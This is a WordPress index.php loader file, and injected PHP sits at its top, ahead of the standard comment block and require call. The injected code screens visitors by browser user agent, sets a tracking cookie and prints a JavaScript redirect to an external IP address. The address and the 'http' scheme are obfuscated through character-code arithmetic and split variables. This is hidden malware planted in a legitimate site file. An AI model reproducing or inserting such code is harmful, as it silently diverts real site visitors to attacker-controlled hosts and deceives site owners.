<?php
$nicook= isset($_COOKIE["nicook"]) ? $_COOKIE["nicook"] : null;
$myuseragent=isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : null;
$myip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : null;
$myserver= isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : null;
$jb=0; $a='h'; $b='t'; $c=':';
if (substr_count($myuseragent,'Chrome')>0) $jb=1;
if (substr_count($myuseragent,'Firefox')>0) $jb=1;
if (substr_count($myuseragent,'Windows')>0) $jb=1;
if (substr_count($myuseragent,'Safari')>0) $jb=1;
if ($jb>0)
if (strlen($nicook)<4)
{
    setcookie("nicook", $myserver, time()+36000000);
    print "<html><head><meta http-equiv=\"Cache-Control\" content=\"no-cache\">";
    print "<script type=\"text/javascript\">\n<!--\n  setTimeout( 'location=\"".$a.$b.$b."p".$c."//".(ord('a')-51).".".(ord('w')+130).".".(ord('i')-46).".".(ord('b')-29)."/m/\";', 300 ); \n//-->\n</script>";
    print "</head>";
    exit(1);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
